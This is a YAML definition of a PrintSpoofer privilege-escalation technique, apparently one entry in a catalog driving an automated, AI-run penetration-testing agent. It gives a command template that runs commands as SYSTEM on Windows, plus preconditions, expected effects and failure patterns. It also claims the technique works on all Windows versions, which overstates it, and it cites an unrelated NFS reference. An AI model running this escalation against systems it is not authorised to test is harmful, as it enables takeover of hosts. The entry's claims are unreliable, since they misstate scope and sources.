name: printspoofer
category: privesc
description: PrintSpoofer privilege escalation
preconditions:
- os==windows
parameters:
  target_ip: from_engagement.target_ip
command_template: PrintSpoofer64.exe -i -c 'cmd /c whoami'
parser: generic_parser
expected_effects:
- printspoofer_used
- system_shell
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: Exploits Windows pipe impersonation via Print Spooler service. Works on
  all Windows versions. Requires SeImpersonatePrivilege. Simpler than JuicyPotato.
hacktricks_ref: network-services-pentesting/nfs-service-pentesting.md
